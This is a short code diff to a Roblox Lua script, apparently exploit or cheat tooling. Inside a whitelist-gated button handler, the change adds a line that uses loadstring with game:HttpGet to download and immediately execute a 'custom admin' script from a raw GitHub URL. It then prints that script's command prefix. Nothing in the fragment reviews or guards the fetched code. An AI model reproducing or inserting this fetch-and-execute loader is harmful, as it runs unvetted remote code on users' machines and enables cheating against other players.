@@ -352,6 +352,14 @@ local function HKLTMEA_fake_script() -- done.wl and load
 	script.Parent.MouseButton1Click:Connect(function()
 	for _, player in ipairs(game.Players:GetPlayers()) do
 			if whitelistednames[player.Name] then
+			
+--load admin
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Deeri1/ine/main/costom%20admin'),true))()
+print("admin loaded")
+print("prefex is ;")
+print("do ;cmds to get started")
+--done
+	
 				
 				warn("whitelisted")
 script.Parent.Parent.Parent.Parent["new load"]:Destroy()
